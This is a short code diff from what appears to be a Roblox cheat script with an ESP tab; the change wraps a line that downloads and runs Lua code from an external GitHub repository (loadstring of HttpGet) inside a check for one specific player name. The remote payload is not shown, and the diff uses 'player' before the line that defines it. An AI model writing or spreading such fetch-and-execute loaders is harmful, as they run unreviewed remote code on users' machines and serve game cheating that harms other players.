@@ -6,7 +6,9 @@ Window:AddMinimizeButton({
   Corner = { CornerRadius = UDim.new(0, 6) }
 })
 
+  if player.Name == "stas1231942" then
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Player01010111Cheater/Private2.0/refs/heads/main/Privatesrc.lua"))()
+end
 
 local player = game.Players.LocalPlayer
 local esp = Window:MakeTab({'ESP' , 'Home'})
